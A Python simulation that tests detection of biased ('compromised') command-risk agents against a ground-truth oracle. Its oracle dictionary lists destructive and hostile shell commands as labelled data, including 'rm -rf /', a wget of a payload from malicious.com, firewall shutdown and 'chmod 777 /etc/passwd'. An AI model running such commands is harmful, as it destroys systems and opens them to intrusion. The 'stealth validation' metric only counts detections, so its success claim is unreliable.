#!/usr/bin/env python3
"""
TCP Stealth Compromise Simulation Framework

This framework implements and validates the breakthrough concept of oblivious 
compromise detection in distributed TCP networks. It empirically tests whether
networks can detect compromised agents through behavioral observation while
keeping the compromised agents unaware of their detection.

Author: TCP Research Consortium
License: MIT
"""

import numpy as np
import random
import json
import time
import hashlib
from dataclasses import dataclass, asdict
from typing import Dict, List, Tuple, Optional, Set
from enum import Enum
import matplotlib.pyplot as plt
import seaborn as sns
from collections import defaultdict, deque
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CompromiseType(Enum):
    """Types of agent compromise scenarios"""
    GRADUAL_DRIFT = "gradual_drift"
    FALSE_POSITIVE = "false_positive"
    FALSE_NEGATIVE = "false_negative"
    SEMANTIC_HIJACK = "semantic_hijack"
    COORDINATION_ATTACK = "coordination_attack"
    CLEAN = "clean"

class CommandEffect(Enum):
    """Actual effects of commands on the system"""
    SAFE = "safe"
    DESTRUCTIVE = "destructive"
    CRITICAL = "critical"
    NETWORK_ACCESS = "network"
    PRIVILEGE_ESCALATION = "privesc"

@dataclass
class Command:
    """Represents a command being analyzed"""
    text: str
    actual_effect: CommandEffect
    context: Dict
    timestamp: float
    
    def __hash__(self):
        return hash(self.text)

@dataclass
class TCPAssessment:
    """TCP agent's assessment of a command"""
    command: Command
    predicted_risk: float  # 0.0 = safe, 1.0 = critical
    confidence: float
    agent_id: str
    reasoning: str
    timestamp: float

@dataclass
class CompromiseEvent:
    """Records when an agent becomes compromised"""
    agent_id: str
    compromise_type: CompromiseType
    start_time: float
    severity: float  # 0.0 = subtle, 1.0 = severe
    parameters: Dict

@dataclass
class DetectionEvent:
    """Records when the network detects a compromise"""
    target_agent: str
    detection_time: float
    confidence: float
    evidence: List[str]
    detector_consensus: int

class GroundTruthOracle:
    """
    Objective oracle that knows the true effects of commands.
    This simulates real system state changes independent of agent assessments.
    """
    
    def __init__(self):
        self.command_database = self._build_ground_truth_database()
        
    def _build_ground_truth_database(self) -> Dict[str, CommandEffect]:
        """Build a database of actual command effects"""
        return {
            # File operations
            "rm -rf /": CommandEffect.DESTRUCTIVE,
            "rm -rf /usr": CommandEffect.DESTRUCTIVE,
            "rm -rf /var": CommandEffect.DESTRUCTIVE,
            "rm file.txt": CommandEffect.SAFE,
            "cp file1 file2": CommandEffect.SAFE,
            "mv file1 file2": CommandEffect.SAFE,
            "ls -la": CommandEffect.SAFE,
            "cat /etc/passwd": CommandEffect.SAFE,
            
            # Network operations
            "wget http://malicious.com/payload": CommandEffect.NETWORK_ACCESS,
            "curl -X POST secret-data": CommandEffect.NETWORK_ACCESS,
            "ssh root@target": CommandEffect.NETWORK_ACCESS,
            "ping google.com": CommandEffect.SAFE,
            
            # Privilege operations
            "sudo rm -rf /": CommandEffect.CRITICAL,
            "chmod 777 /etc/passwd": CommandEffect.PRIVILEGE_ESCALATION,
            "chown root:root malware": CommandEffect.PRIVILEGE_ESCALATION,
            "sudo -i": CommandEffect.PRIVILEGE_ESCALATION,
            
            # System operations
            "systemctl stop firewall": CommandEffect.CRITICAL,
            "iptables -F": CommandEffect.CRITICAL,
            "echo 'harmless'": CommandEffect.SAFE,
            "ps aux": CommandEffect.SAFE,
            "top": CommandEffect.SAFE,
        }
    
    def get_true_effect(self, command: Command) -> CommandEffect:
        """Get the objective true effect of a command"""
        base_command = command.text.split()[0] if command.text.split() else ""
        
        # Exact match first
        if command.text in self.command_database:
            return self.command_database[command.text]
        
        # Pattern matching for common cases
        if command.text.startswith("rm -rf /"):
            return CommandEffect.DESTRUCTIVE
        elif command.text.startswith("sudo"):
            return CommandEffect.PRIVILEGE_ESCALATION
        elif "wget" in command.text or "curl" in command.text:
            return CommandEffect.NETWORK_ACCESS
        elif base_command in ["ls", "cat", "echo", "ps", "top"]:
            return CommandEffect.SAFE
        
        # Default classification
        return CommandEffect.SAFE

class TCPAgent:
    """
    Represents a TCP agent that can be compromised.
    Each agent has its own assessment logic that can be subtly modified.
    """
    
    def __init__(self, agent_id: str, compromise_type: CompromiseType = CompromiseType.CLEAN):
        self.agent_id = agent_id
        self.compromise_type = compromise_type
        self.behavioral_history = deque(maxlen=1000)
        self.compromise_parameters = {}
        self.compromise_start_time = None
        self.detection_evasion_score = 0.0
        
        # Base assessment parameters (can be compromised)
        self.risk_threshold = 0.5
        self.false_positive_rate = 0.05
        self.false_negative_rate = 0.05
        
    def assess_command(self, command: Command, oracle: GroundTruthOracle) -> TCPAssessment:
        """Assess a command's risk level (potentially compromised assessment)"""
        
        # Get the true effect for base assessment
        true_effect = oracle.get_true_effect(command)
        
        # Base risk assessment
        base_risk = self._calculate_base_risk(command, true_effect)
        
        # Apply compromise modifications
        final_risk = self._apply_compromise_logic(base_risk, command, true_effect)
        
        # Generate assessment
        assessment = TCPAssessment(
            command=command,
            predicted_risk=final_risk,
            confidence=0.85 + random.uniform(-0.15, 0.15),
            agent_id=self.agent_id,
            reasoning=self._generate_reasoning(command, final_risk),
            timestamp=time.time()
        )
        
        # Record in behavioral history
        self.behavioral_history.append(assessment)
        
        return assessment
    
    def _calculate_base_risk(self, command: Command, true_effect: CommandEffect) -> float:
        """Calculate base risk before compromise modifications"""
        risk_mapping = {
            CommandEffect.SAFE: 0.1,
            CommandEffect.NETWORK_ACCESS: 0.4,
            CommandEffect.PRIVILEGE_ESCALATION: 0.7,
            CommandEffect.DESTRUCTIVE: 0.9,
            CommandEffect.CRITICAL: 0.95
        }
        
        base_risk = risk_mapping.get(true_effect, 0.3)
        
        # Add some natural variation
        base_risk += random.uniform(-0.1, 0.1)
        return max(0.0, min(1.0, base_risk))
    
    def _apply_compromise_logic(self, base_risk: float, command: Command, true_effect: CommandEffect) -> float:
        """Apply compromise-specific modifications to risk assessment"""
        
        if self.compromise_type == CompromiseType.CLEAN:
            return base_risk
        
        elif self.compromise_type == CompromiseType.GRADUAL_DRIFT:
            # Gradually become more/less permissive over time
            if self.compromise_start_time:
                drift_factor = self.compromise_parameters.get('drift_rate', 0.01)
                time_elapsed = time.time() - self.compromise_start_time
                drift = drift_factor * time_elapsed
                
                if self.compromise_parameters.get('direction') == 'permissive':
                    return max(0.0, base_risk - drift)
                else:
                    return min(1.0, base_risk + drift)
            
        elif self.compromise_type == CompromiseType.FALSE_POSITIVE:
            # Systematically over-assess safe commands as risky
            if true_effect == CommandEffect.SAFE:
                false_pos_rate = self.compromise_parameters.get('false_positive_boost', 0.3)
                return min(1.0, base_risk + false_pos_rate)
                
        elif self.compromise_type == CompromiseType.FALSE_NEGATIVE:
            # Systematically under-assess dangerous commands as safe
            if true_effect in [CommandEffect.DESTRUCTIVE, CommandEffect.CRITICAL]:
                false_neg_rate = self.compromise_parameters.get('false_negative_reduction', 0.4)
                return max(0.0, base_risk - false_neg_rate)
                
        elif self.compromise_type == CompromiseType.SEMANTIC_HIJACK:
            # Try to shift network consensus toward specific patterns
            target_pattern = self.compromise_parameters.get('target_pattern', 'rm')
            if target_pattern in command.text:
                hijack_direction = self.compromise_parameters.get('hijack_direction', 'safe')
                if hijack_direction == 'safe':
                    return max(0.0, base_risk - 0.5)
                else:
                    return min(1.0, base_risk + 0.5)
        
        return base_risk
    
    def _generate_reasoning(self, command: Command, risk: float) -> str:
        """Generate reasoning for the assessment"""
        if risk < 0.3:
            return f"Command '{command.text}' appears safe with standard file operations"
        elif risk < 0.7:
            return f"Command '{command.text}' has moderate risk due to system access"
        else:
            return f"Command '{command.text}' flagged as high risk - destructive potential detected"
    
    def become_compromised(self, compromise_type: CompromiseType, parameters: Dict):
        """Compromise this agent with specific parameters"""
        self.compromise_type = compromise_type
        self.compromise_parameters = parameters
        self.compromise_start_time = time.time()
        logger.info(f"Agent {self.agent_id} compromised: {compromise_type.value}")

class StealthDetectionEngine:
    """
    Detects compromised agents through behavioral analysis without alerting them.
    Implements the core oblivious detection algorithm.
    """
    
    def __init__(self, detection_threshold: float = 0.6):
        self.detection_threshold = detection_threshold
        self.agent_baselines = {}
        self.detection_history = []
        self.quarantined_agents = set()
        
    def establish_baseline(self, agent: TCPAgent, commands: List[Command], oracle: GroundTruthOracle):
        """Establish behavioral baseline for an agent"""
        assessments = []
        for command in commands:
            assessment = agent.assess_command(command, oracle)
            assessments.append(assessment)
        
        # Calculate baseline metrics
        accuracy_scores = []
        for assessment in assessments:
            true_effect = oracle.get_true_effect(assessment.command)
            true_risk = self._effect_to_risk(true_effect)
            accuracy = 1.0 - abs(assessment.predicted_risk - true_risk)
            accuracy_scores.append(accuracy)
        
        self.agent_baselines[agent.agent_id] = {
            'mean_accuracy': np.mean(accuracy_scores),
            'std_accuracy': np.std(accuracy_scores),
            'assessment_count': len(assessments),
            'establishment_time': time.time()
        }
        
        logger.info(f"Baseline established for agent {agent.agent_id}: "
                   f"accuracy {np.mean(accuracy_scores):.3f} ± {np.std(accuracy_scores):.3f}")
    
    def detect_compromise(self, agent: TCPAgent, recent_commands: List[Command], 
                         oracle: GroundTruthOracle) -> Optional[DetectionEvent]:
        """
        Detect if an agent has been compromised based on behavioral deviation.
        This is the core stealth detection algorithm.
        """
        
        if agent.agent_id not in self.agent_baselines:
            return None
        
        # Get recent assessments
        recent_assessments = []
        for command in recent_commands:
            assessment = agent.assess_command(command, oracle)
            recent_assessments.append(assessment)
        
        # Calculate current performance metrics
        current_accuracy_scores = []
        systematic_bias_scores = []
        
        for assessment in recent_assessments:
            true_effect = oracle.get_true_effect(assessment.command)
            true_risk = self._effect_to_risk(true_effect)
            
            accuracy = 1.0 - abs(assessment.predicted_risk - true_risk)
            current_accuracy_scores.append(accuracy)
            
            # Check for systematic bias
            bias = assessment.predicted_risk - true_risk
            systematic_bias_scores.append(bias)
        
        if not current_accuracy_scores:
            return None
        
        baseline = self.agent_baselines[agent.agent_id]
        current_accuracy = np.mean(current_accuracy_scores)
        systematic_bias = np.mean(systematic_bias_scores)
        
        # Behavioral deviation analysis
        evidence = []
        suspicion_score = 0.0
        
        # 1. Accuracy degradation
        accuracy_drop = baseline['mean_accuracy'] - current_accuracy
        if accuracy_drop > 2 * baseline['std_accuracy']:
            evidence.append(f"Accuracy dropped by {accuracy_drop:.3f} (baseline: {baseline['mean_accuracy']:.3f})")
            suspicion_score += 0.3
        
        # 2. Systematic bias detection
        if abs(systematic_bias) > 0.15:
            bias_direction = "over-permissive" if systematic_bias < 0 else "over-restrictive"
            evidence.append(f"Systematic {bias_direction} bias detected: {systematic_bias:.3f}")
            suspicion_score += 0.4
        
        # 3. Pattern consistency analysis
        pattern_inconsistency = self._analyze_pattern_consistency(recent_assessments, oracle)
        if pattern_inconsistency > 0.3:
            evidence.append(f"Pattern inconsistency detected: {pattern_inconsistency:.3f}")
            suspicion_score += 0.3
        
        # 4. Temporal behavior analysis
        temporal_anomaly = self._analyze_temporal_patterns(agent)
        if temporal_anomaly > 0.25:
            evidence.append(f"Temporal behavior anomaly: {temporal_anomaly:.3f}")
            suspicion_score += 0.2
        
        # Detection decision
        if suspicion_score >= self.detection_threshold and len(evidence) >= 2:
            detection_event = DetectionEvent(
                target_agent=agent.agent_id,
                detection_time=time.time(),
                confidence=suspicion_score,
                evidence=evidence,
                detector_consensus=1
            )
            
            self.detection_history.append(detection_event)
            logger.warning(f"COMPROMISE DETECTED: Agent {agent.agent_id} "
                          f"(confidence: {suspicion_score:.3f}, evidence: {len(evidence)} items)")
            
            return detection_event
        
        return None
    
    def _effect_to_risk(self, effect: CommandEffect) -> float:
        """Convert command effect to risk score"""
        mapping = {
            CommandEffect.SAFE: 0.1,
            CommandEffect.NETWORK_ACCESS: 0.4,
            CommandEffect.PRIVILEGE_ESCALATION: 0.7,
            CommandEffect.DESTRUCTIVE: 0.9,
            CommandEffect.CRITICAL: 0.95
        }
        return mapping.get(effect, 0.3)
    
    def _analyze_pattern_consistency(self, assessments: List[TCPAssessment], 
                                   oracle: GroundTruthOracle) -> float:
        """Analyze consistency of assessment patterns"""
        if len(assessments) < 5:
            return 0.0
        
        # Group by command type and check for inconsistencies
        type_assessments = defaultdict(list)
        for assessment in assessments:
            true_effect = oracle.get_true_effect(assessment.command)
            type_assessments[true_effect].append(assessment.predicted_risk)
        
        inconsistency_score = 0.0
        for effect_type, risks in type_assessments.items():
            if len(risks) > 1:
                std_dev = np.std(risks)
                # High standard deviation indicates inconsistent assessment of same types
                if std_dev > 0.3:
                    inconsistency_score += std_dev
        
        return min(1.0, inconsistency_score)
    
    def _analyze_temporal_patterns(self, agent: TCPAgent) -> float:
        """Analyze temporal patterns in agent behavior"""
        if len(agent.behavioral_history) < 10:
            return 0.0
        
        # Look for sudden changes in assessment patterns
        recent_assessments = list(agent.behavioral_history)[-10:]
        historical_assessments = list(agent.behavioral_history)[:-10] if len(agent.behavioral_history) > 10 else []
        
        if not historical_assessments:
            return 0.0
        
        recent_risk_avg = np.mean([a.predicted_risk for a in recent_assessments])
        historical_risk_avg = np.mean([a.predicted_risk for a in historical_assessments])
        
        # Detect sudden shifts in risk assessment patterns
        shift_magnitude = abs(recent_risk_avg - historical_risk_avg)
        return min(1.0, shift_magnitude * 2)  # Scale to 0-1 range

class SemanticAdaptationEngine:
    """
    Automatically creates quarantine environments and adapts network semantics
    when compromised agents are detected.
    """
    
    def __init__(self):
        self.quarantine_environments = {}
        self.adaptation_history = []
        
    def create_quarantine(self, compromised_agent: str, detection_event: DetectionEvent) -> str:
        """Create a quarantine environment for a compromised agent"""
        quarantine_id = f"quarantine_{compromised_agent}_{int(time.time())}"
        
        quarantine_env = {
            'id': quarantine_id,
            'compromised_agent': compromised_agent,
            'creation_time': time.time(),
            'detection_confidence': detection_event.confidence,
            'evidence': detection_event.evidence,
            'parallel_descriptors': self._create_parallel_descriptors(),
            'isolation_level': self._determine_isolation_level(detection_event.confidence)
        }
        
        self.quarantine_environments[quarantine_id] = quarantine_env
        
        logger.info(f"Quarantine created: {quarantine_id} for agent {compromised_agent}")
        return quarantine_id
    
    def _create_parallel_descriptors(self) -> Dict:
        """Create parallel descriptor evolution for quarantined environment"""
        return {
            'descriptor_set': 'quarantine_v1',
            'evolution_rules': 'isolated_consensus',
            'validation_threshold': 0.95,
            'learning_rate': 0.1
        }
    
    def _determine_isolation_level(self, confidence: float) -> str:
        """Determine appropriate isolation level based on detection confidence"""
        if confidence > 0.9:
            return "complete_isolation"
        elif confidence > 0.8:
            return "limited_interaction"
        else:
            return "monitored_participation"
    
    def adapt_network_routing(self, compromised_agents: Set[str], active_agents: List[TCPAgent]):
        """Adapt network routing to bypass compromised agents"""
        clean_agents = [agent for agent in active_agents if agent.agent_id not in compromised_agents]
        
        adaptation = {
            'timestamp': time.time(),
            'bypassed_agents': list(compromised_agents),
            'active_clean_agents': len(clean_agents),
            'routing_efficiency': len(clean_agents) / len(active_agents) if active_agents else 0.0
        }
        
        self.adaptation_history.append(adaptation)
        
        logger.info(f"Network routing adapted: bypassing {len(compromised_agents)} compromised agents, "
                   f"routing through {len(clean_agents)} clean agents")

class TCPStealthSimulator:
    """
    Main simulation framework that orchestrates the entire stealth compromise
    detection and adaptation system.
    """
    
    def __init__(self, num_agents: int = 20, compromise_rate: float = 0.15):
        self.num_agents = num_agents
        self.compromise_rate = compromise_rate
        
        # Core components
        self.oracle = GroundTruthOracle()
        self.detector = StealthDetectionEngine()
        self.adapter = SemanticAdaptationEngine()
        
        # Simulation state
        self.agents = []
        self.simulation_time = 0.0
        self.command_stream = []
        self.results = {
            'compromises': [],
            'detections': [],
            'false_positives': [],
            'false_negatives': [],
            'network_health': []
        }
        
        self._initialize_agents()
        self._generate_command_stream()
    
    def _initialize_agents(self):
        """Initialize TCP agents with some potentially compromised"""
        for i in range(self.num_agents):
            agent_id = f"agent_{i:03d}"
            agent = TCPAgent(agent_id)
            self.agents.append(agent)
        
        logger.info(f"Initialized {self.num_agents} TCP agents")
    
    def _generate_command_stream(self, num_commands: int = 1000):
        """Generate a stream of commands for testing"""
        command_templates = [
            "rm -rf /tmp/file{}.txt",
            "cp /home/user/doc{}.txt /backup/",
            "sudo rm -rf /var/log/system{}",
            "wget http://updates.example.com/patch{}.tar.gz",
            "ls -la /home/user/project{}",
            "chmod 755 /usr/bin/app{}",
            "systemctl restart service{}",
            "echo 'Processing item {}' > /tmp/status",
            "curl -X POST -d 'data={}' https://api.service.com/update",
            "ps aux | grep process{}"
        ]
        
        contexts = [
            {"environment": "production", "user": "admin"},
            {"environment": "development", "user": "developer"},
            {"environment": "testing", "user": "tester"},
            {"environment": "staging", "user": "deployer"}
        ]
        
        for i in range(num_commands):
            template = random.choice(command_templates)
            command_text = template.format(i)
            context = random.choice(contexts)
            
            command = Command(
                text=command_text,
                actual_effect=self.oracle.get_true_effect(Command(command_text, CommandEffect.SAFE, {}, 0.0)),
                context=context,
                timestamp=time.time() + i * 0.1
            )
            
            self.command_stream.append(command)
        
        logger.info(f"Generated {len(self.command_stream)} test commands")
    
    def introduce_compromises(self):
        """Introduce compromises into a subset of agents"""
        num_to_compromise = int(self.num_agents * self.compromise_rate)
        agents_to_compromise = random.sample(self.agents, num_to_compromise)
        
        compromise_scenarios = [
            (CompromiseType.GRADUAL_DRIFT, {'drift_rate': 0.02, 'direction': 'permissive'}),
            (CompromiseType.FALSE_POSITIVE, {'false_positive_boost': 0.4}),
            (CompromiseType.FALSE_NEGATIVE, {'false_negative_reduction': 0.5}),
            (CompromiseType.SEMANTIC_HIJACK, {'target_pattern': 'rm', 'hijack_direction': 'safe'}),
        ]
        
        for agent in agents_to_compromise:
            compromise_type, parameters = random.choice(compromise_scenarios)
            agent.become_compromised(compromise_type, parameters)
            
            self.results['compromises'].append(CompromiseEvent(
                agent_id=agent.agent_id,
                compromise_type=compromise_type,
                start_time=time.time(),
                severity=random.uniform(0.3, 0.9),
                parameters=parameters
            ))
        
        logger.info(f"Introduced {len(agents_to_compromise)} compromises")
    
    def establish_baselines(self):
        """Establish behavioral baselines for all agents"""
        baseline_commands = self.command_stream[:100]  # Use first 100 commands for baseline
        
        for agent in self.agents:
            self.detector.establish_baseline(agent, baseline_commands, self.oracle)
        
        logger.info("Behavioral baselines established for all agents")
    
    def run_detection_phase(self):
        """Run the main detection phase of the simulation"""
        detection_commands = self.command_stream[100:800]  # Use commands 100-800 for detection
        batch_size = 50
        
        for i in range(0, len(detection_commands), batch_size):
            batch = detection_commands[i:i + batch_size]
            
            for agent in self.agents:
                detection_event = self.detector.detect_compromise(agent, batch, self.oracle)
                
                if detection_event:
                    self.results['detections'].append(detection_event)
                    
                    # Create quarantine for detected agent
                    quarantine_id = self.adapter.create_quarantine(agent.agent_id, detection_event)
            
            # Update network health metrics
            compromised_agents = {event.agent_id for event in self.results['compromises']}
            detected_agents = {event.target_agent for event in self.results['detections']}
            
            health_metric = {
                'timestamp': time.time(),
                'total_agents': len(self.agents),
                'compromised_count': len(compromised_agents),
                'detected_count': len(detected_agents),
                'undetected_compromised': len(compromised_agents - detected_agents),
                'network_efficiency': len(detected_agents) / len(compromised_agents) if compromised_agents else 1.0
            }
            
            self.results['network_health'].append(health_metric)
        
        # Final network adaptation
        all_detected = {event.target_agent for event in self.results['detections']}
        self.adapter.adapt_network_routing(all_detected, self.agents)
        
        logger.info("Detection phase completed")
    
    def analyze_results(self) -> Dict:
        """Analyze simulation results and generate metrics"""
        compromised_agents = {event.agent_id for event in self.results['compromises']}
        detected_agents = {event.target_agent for event in self.results['detections']}
        
        # Calculate key metrics
        true_positives = len(compromised_agents & detected_agents)
        false_positives = len(detected_agents - compromised_agents)
        false_negatives = len(compromised_agents - detected_agents)
        true_negatives = self.num_agents - len(compromised_agents | detected_agents)
        
        precision = true_positives / (true_positives + false_positives) if (true_positives + false_positives) > 0 else 0
        recall = true_positives / (true_positives + false_negatives) if (true_positives + false_negatives) > 0 else 0
        f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
        
        accuracy = (true_positives + true_negatives) / self.num_agents
        
        analysis = {
            'detection_metrics': {
                'true_positives': true_positives,
                'false_positives': false_positives,
                'false_negatives': false_negatives,
                'true_negatives': true_negatives,
                'precision': precision,
                'recall': recall,
                'f1_score': f1_score,
                'accuracy': accuracy
            },
            'compromise_analysis': {
                'total_compromised': len(compromised_agents),
                'compromise_types': [event.compromise_type.value for event in self.results['compromises']],
                'detection_rate': true_positives / len(compromised_agents) if compromised_agents else 0,
                'stealth_maintained': true_positives > 0  # Compromised agents don't know they're detected
            },
            'network_resilience': {
                'functional_agents': self.num_agents - false_positives,  # Agents still participating
                'adaptation_success': len(detected_agents) > 0,
                'quarantine_environments': len(self.adapter.quarantine_environments)
            }
        }
        
        return analysis
    
    def run_simulation(self) -> Dict:
        """Run the complete simulation"""
        logger.info("🚀 Starting TCP Stealth Compromise Simulation")
        
        # Phase 1: Establish baselines
        self.establish_baselines()
        
        # Phase 2: Introduce compromises
        self.introduce_compromises()
        
        # Phase 3: Run detection
        self.run_detection_phase()
        
        # Phase 4: Analyze results
        analysis = self.analyze_results()
        
        logger.info("✅ Simulation completed successfully")
        return analysis
    
    def generate_report(self, analysis: Dict):
        """Generate a comprehensive simulation report"""
        print("\n" + "="*80)
        print("🔍 TCP STEALTH COMPROMISE SIMULATION RESULTS")
        print("="*80)
        
        print(f"\n📊 DETECTION PERFORMANCE")
        print(f"   Precision: {analysis['detection_metrics']['precision']:.3f}")
        print(f"   Recall:    {analysis['detection_metrics']['recall']:.3f}")
        print(f"   F1 Score:  {analysis['detection_metrics']['f1_score']:.3f}")
        print(f"   Accuracy:  {analysis['detection_metrics']['accuracy']:.3f}")
        
        print(f"\n🎭 COMPROMISE ANALYSIS")
        print(f"   Total Agents: {self.num_agents}")
        print(f"   Compromised:  {analysis['compromise_analysis']['total_compromised']}")
        print(f"   Detected:     {analysis['detection_metrics']['true_positives']}")
        print(f"   Undetected:   {analysis['detection_metrics']['false_negatives']}")
        print(f"   Detection Rate: {analysis['compromise_analysis']['detection_rate']:.1%}")
        
        print(f"\n🛡️ NETWORK RESILIENCE")
        print(f"   Functional Agents: {analysis['network_resilience']['functional_agents']}")
        print(f"   Quarantine Environments: {analysis['network_resilience']['quarantine_environments']}")
        print(f"   Adaptation Success: {'✅' if analysis['network_resilience']['adaptation_success'] else '❌'}")
        
        print(f"\n🕵️ STEALTH VALIDATION")
        stealth_success = analysis['compromise_analysis']['stealth_maintained']
        print(f"   Oblivious Detection: {'✅ SUCCESS' if stealth_success else '❌ FAILED'}")
        print(f"   Compromised agents remain unaware of their detection status")
        
        print("\n" + "="*80)

def main():
    """Run the TCP Stealth Compromise Simulation"""
    
    # Create and run simulation
    simulator = TCPStealthSimulator(num_agents=25, compromise_rate=0.20)
    analysis = simulator.run_simulation()
    
    # Generate report
    simulator.generate_report(analysis)
    
    # Save detailed results
    timestamp = int(time.time())
    results_file = f"tcp_stealth_simulation_results_{timestamp}.json"
    
    with open(results_file, 'w') as f:
        # Convert dataclasses to dicts for JSON serialization
        serializable_results = {
            'analysis': analysis,
            'compromises': [asdict(event) for event in simulator.results['compromises']],
            'detections': [asdict(event) for event in simulator.results['detections']],
            'network_health': simulator.results['network_health'],
            'simulation_parameters': {
                'num_agents': simulator.num_agents,
                'compromise_rate': simulator.compromise_rate,
                'total_commands': len(simulator.command_stream)
            }
        }
        json.dump(serializable_results, f, indent=2, default=str)
    
    print(f"\n📄 Detailed results saved to: {results_file}")
    
    return analysis

if __name__ == "__main__":
    main()